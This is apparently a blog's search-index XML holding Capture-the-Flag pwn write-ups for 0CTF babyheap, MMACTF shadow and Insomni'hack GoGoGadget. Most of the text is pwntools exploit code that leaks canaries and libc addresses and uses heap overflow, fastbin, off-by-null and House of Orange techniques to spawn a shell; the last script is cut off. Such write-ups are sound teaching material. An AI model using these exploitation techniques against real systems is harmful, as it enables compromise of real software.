<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0ctf 2017 babyheap</title>
    <url>/2018/07/11/0ctf17-pwn-babyheap/</url>
    <content><![CDATA[<p>This pwn is a classic heap pwn. In its <code>Edit()</code> function exits a heap overflow of arbitrarily write.</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Edit</span><span class="params">(__int64 List)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 Item; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  Item = InputNum();</span><br><span class="line">  v2 = Item;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)Item &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)Item &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Item = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24L</span>L * (<span class="keyword">signed</span> <span class="keyword">int</span>)Item + List);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)Item == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);                         <span class="comment">// overflow</span></span><br><span class="line">      Item = InputNum();</span><br><span class="line">      len = Item;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)Item &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        Item = InputString(*(_QWORD *)(<span class="number">24L</span>L * v2 + List + <span class="number">16</span>), len);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Because the List(contains each block’s status, size and content’s pointer) is at random address, we cannot overflow and overwrite the List. So what I chose to do is to overflow the chunk to leak the libc information and perform fastbin attack.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">&#x27;b *&#x27;</span> + str(hex(<span class="number">0x555555554000</span> + <span class="number">0x113d</span>)))</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#0</span></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">    Add(p, <span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    Add(p, <span class="number">0x200</span> - <span class="number">0x90</span> - <span class="number">0x10</span>) <span class="comment">#6</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#7</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#8</span></span><br><span class="line">    Edit(p, <span class="number">4</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x201</span>))</span><br><span class="line">    Delete(p, <span class="number">5</span>) <span class="comment">#5</span></span><br><span class="line">    Add(p, <span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    recv = Show(p, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    libc_base_addr = u64(recv[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x3c4b78</span></span><br><span class="line">    libc.address = libc_base_addr</span><br><span class="line">    <span class="keyword">print</span> hex(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>])</span><br><span class="line">    <span class="comment"># chunk size 0x7f, ready for fastbin attack</span></span><br><span class="line">    fake_chunk = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">3</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2017</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Jan pwn writeup</title>
    <url>/2019/01/30/19-Jan/</url>
    <content><![CDATA[<h2 id="MMACTF-2016-shadow"><a href="#MMACTF-2016-shadow" class="headerlink" title="MMACTF 2016 shadow"></a>MMACTF 2016 shadow</h2><p>程序的基本功能包括：输入姓名；设定<code>message</code>长度；输入<code>message</code>。共有3次修改姓名和<code>message</code>的机会。</p>
<a id="more"></a>

<p>程序中实现了一个影子栈及<code>pop</code>、<code>push</code>、<code>call</code>和<code>ret</code>的函数，使得无法覆盖调用<code>ret</code>进行返回的函数的返回地址。在进行函数调用时，未被保护到的函数为程序调用的libc中的函数，这些函数仍然执行汇编指令<code>ret</code>进行返回而不是程序自行实现的<code>ret</code>函数。</p>
<p>利用无符号数的转换来泄漏canary和libc地址。由于<code>name</code>的地址保存在栈上，通过输入的漏洞可以覆盖该地址为<code>_environ</code>地址来泄漏栈地址。用于记录剩余输入次数的变量也保存在栈上。在修改<code>name</code>前，把<code>name</code>指向<code>read</code>函数的返回地址（libc中的函数没有得到<code>ret</code>函数的保护），使得在修改<code>name</code>时能够控制程序执行流来getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./shadow&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak canary</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;length : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;message : &#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">33</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">33</span>)</span><br><span class="line">    canary = <span class="string">&#x27;\x00&#x27;</span> + p.recv(<span class="number">3</span>)</span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(y/n) :&#x27;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;length : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">41</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;message : &#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(payload)</span><br><span class="line">    recv = <span class="string">&#x27;\x00&#x27;</span> + p.recv(<span class="number">3</span>)</span><br><span class="line">    recv = u32(recv)</span><br><span class="line">    <span class="keyword">print</span> hex(recv)</span><br><span class="line">    libc.address = recv - (<span class="number">0xf76f3000</span> - <span class="number">0xf7541000</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    <span class="comment"># leak stack address</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(y/n) :&#x27;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;length : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + canary + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]) + p32(<span class="number">0x0804a800</span>) + p32(<span class="number">100</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;message : &#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;) &lt;&#x27;</span>)</span><br><span class="line">    stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">    <span class="comment"># attack</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(y/n) :&#x27;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;length : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + canary + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(stack_addr - (<span class="number">0x98c</span><span class="number">-0x7bc</span>)) + p32(<span class="number">0x0804a800</span>) + p32(<span class="number">100</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;message : &#x27;</span>, payload)</span><br><span class="line">    payload = p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0x0804a800</span>) + p64(next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;name : &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Insomni’hack-2018-GoGoGadget"><a href="#Insomni’hack-2018-GoGoGadget" class="headerlink" title="Insomni’hack 2018 GoGoGadget"></a>Insomni’hack 2018 GoGoGadget</h2><p>Copter输入内容时调用的<code>read</code>函数，可以用来泄漏地址。Gadget的<code>scanf</code>函数导致<code>off-by-null</code>，可用来制造堆块重叠。利用<code>House of Orange</code>来getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">    <span class="string">&#x27;i386&#x27;</span>: <span class="number">0x98</span>,</span><br><span class="line">    <span class="string">&#x27;amd64&#x27;</span>: <span class="number">0xe0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">    <span class="string">&#x27;i386&#x27;</span>: &#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">        <span class="number">0x4</span>: <span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>: <span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">        <span class="number">0xc</span>: <span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x10</span>: <span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x14</span>: <span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x18</span>: <span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x1c</span>: <span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>: <span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x24</span>: <span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x28</span>: <span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x2c</span>: <span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x30</span>: <span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">        <span class="number">0x34</span>: <span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>: <span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">        <span class="number">0x3c</span>: <span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">        <span class="number">0x40</span>: <span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x44</span>: <span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">        <span class="number">0x46</span>: <span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x47</span>: <span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">        <span class="number">0x48</span>: <span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">        <span class="number">0x4c</span>: <span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x54</span>: <span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">        <span class="number">0x58</span>: <span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">        <span class="number">0x5c</span>: <span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">        <span class="number">0x60</span>: <span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">        <span class="number">0x64</span>: <span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">        <span class="number">0x68</span>: <span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">        <span class="number">0x6c</span>: <span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">        <span class="number">0x94</span>: <span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;amd64&#x27;</span>: &#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>: <span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x10</span>: <span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x18</span>: <span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>: <span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x28</span>: <span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x30</span>: <span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>: <span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x40</span>: <span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x48</span>: <span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x50</span>: <span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x58</span>: <span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x60</span>: <span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">        <span class="number">0x68</span>: <span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">        <span class="number">0x70</span>: <span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">        <span class="number">0x74</span>: <span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">        <span class="number">0x78</span>: <span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x80</span>: <span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">        <span class="number">0x82</span>: <span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x83</span>: <span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">        <span class="number">0x88</span>: <span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">        <span class="number">0x90</span>: <span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x98</span>: <span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">        <span class="number">0xa0</span>: <span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">        <span class="number">0xa8</span>: <span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">        <span class="number">0xb0</span>: <span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">        <span class="number">0xb8</span>: <span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">        <span class="number">0xc0</span>: <span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">        <span class="number">0xc4</span>: <span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">        <span class="number">0xd8</span>: <span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IO_FILE_plus_struct</span>(<span class="params">dict</span>):</span></span><br><span class="line">    arch = <span class="literal">None</span></span><br><span class="line">    endian = <span class="literal">None</span></span><br><span class="line">    fake_file = <span class="literal">None</span></span><br><span class="line">    size = <span class="number">0</span></span><br><span class="line">    FILE_struct = []</span><br><span class="line"></span><br><span class="line"><span class="meta">    @LocalContext</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.arch = context.arch</span><br><span class="line">        self.endian = context.endian</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.arch != <span class="string">&#x27;i386&#x27;</span> <span class="keyword">and</span> self.arch != <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            log.error(<span class="string">&#x27;architecture not supported!&#x27;</span>)</span><br><span class="line">        success(<span class="string">&#x27;arch: &#x27;</span>+str(self.arch))</span><br><span class="line"></span><br><span class="line">        self.FILE_struct = [_IO_FILE_plus[self.arch][i]</span><br><span class="line">                            <span class="keyword">for</span> i <span class="keyword">in</span> sorted(_IO_FILE_plus[self.arch].keys())]</span><br><span class="line">        <span class="keyword">print</span> self.FILE_struct</span><br><span class="line">        self.update(&#123;r: <span class="number">0</span> <span class="keyword">for</span> r <span class="keyword">in</span> self.FILE_struct&#125;)</span><br><span class="line">        self.size = _IO_FILE_plus_size[self.arch]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span>(<span class="params">self, item, value</span>):</span></span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> self.FILE_struct:</span><br><span class="line">            log.error(<span class="string">&quot;Unknown item %r (not in %r)&quot;</span> % (item, self.FILE_struct))</span><br><span class="line">        super(IO_FILE_plus_struct, self).__setitem__(item, value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span>(<span class="params">self, attr, value</span>):</span></span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">in</span> IO_FILE_plus_struct.__dict__:</span><br><span class="line">            super(IO_FILE_plus_struct, self).__setattr__(attr, value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self[attr] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span>(<span class="params">self, attr</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self[attr]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> context.local(arch=self.arch):</span><br><span class="line">            <span class="keyword">for</span> item_offset <span class="keyword">in</span> sorted(self.item_offset):</span><br><span class="line">                <span class="keyword">if</span> len(fake_file) &lt; item_offset:</span><br><span class="line">                    fake_file += <span class="string">&quot;\x00&quot;</span>*(item_offset - len(fake_file))</span><br><span class="line">                fake_file += pack(self[_IO_FILE_plus[self.arch]</span><br><span class="line">                                       [item_offset]], word_size=<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line">            fake_file += <span class="string">&quot;\x00&quot;</span>*(self.size - len(fake_file))</span><br><span class="line">        <span class="keyword">return</span> fake_file</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">item_offset</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> _IO_FILE_plus[self.arch].keys()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span>(<span class="params">p, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Go Go Gadget: &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Gadget :&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">if</span> len(content) == <span class="number">0xa8</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Go Go Gadget: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Go Go Gadget: &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Gadget [id] :&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GoGoGadget</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Go Go Gadget: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Gadget [idx] :&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Active</span>(<span class="params">p, speed, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Go Go Gadget: &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Speed :&#x27;</span>, str(speed))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Destination :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Deactive</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Go Go Gadget: &#x27;</span>, str(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GoGoCopter</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Go Go Gadget: &#x27;</span>, str(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./gogogadget&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    p = process(BIN_PATH)</span><br><span class="line">    elf = ELF(BIN_PATH)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Create(p, p64(<span class="number">0x60</span>) * (<span class="number">0xa0</span> / <span class="number">8</span>))</span><br><span class="line">    Create(p, p64(<span class="number">0x60</span>) * (<span class="number">0xa0</span> / <span class="number">8</span>))</span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line">    Delete(p, <span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xa0</span> + p64(<span class="number">0xb0</span>)</span><br><span class="line">    Create(p, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Wrong input !&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xa0</span> + p64(<span class="number">0xb0</span>)[:<span class="number">7</span>]</span><br><span class="line">    Create(p, payload)</span><br><span class="line"></span><br><span class="line">    Active(p, <span class="number">0</span>, <span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    GoGoCopter(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Gogo Copter To: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    arena_88_addr = u64(recv.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc.address = arena_88_addr - (<span class="number">0x7efee8b41b78</span> - <span class="number">0x00007efee877d000</span>)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    Delete(p, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Create(p, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    Delete(p, <span class="number">3</span>)</span><br><span class="line">    GoGoCopter(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Gogo Copter To: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">6</span>)</span><br><span class="line">    heap_addr = u64(recv.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    fake_file = IO_FILE_plus_struct()</span><br><span class="line">    fake_file._flags = u64(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    fake_file._IO_read_ptr = <span class="number">0x61</span></span><br><span class="line">    fake_file._IO_read_base = <span class="number">0x7fffffffffff</span><span class="number">-0x10</span></span><br><span class="line">    fake_file._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_file._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_file._mode = <span class="number">0</span></span><br><span class="line">    fake_file.vtable = heap_addr - <span class="number">80</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]) * <span class="number">3</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0xf1</span>)[:<span class="number">2</span>]</span><br><span class="line">    Create(p, payload)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x21</span></span><br><span class="line">    Create(p, payload)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span 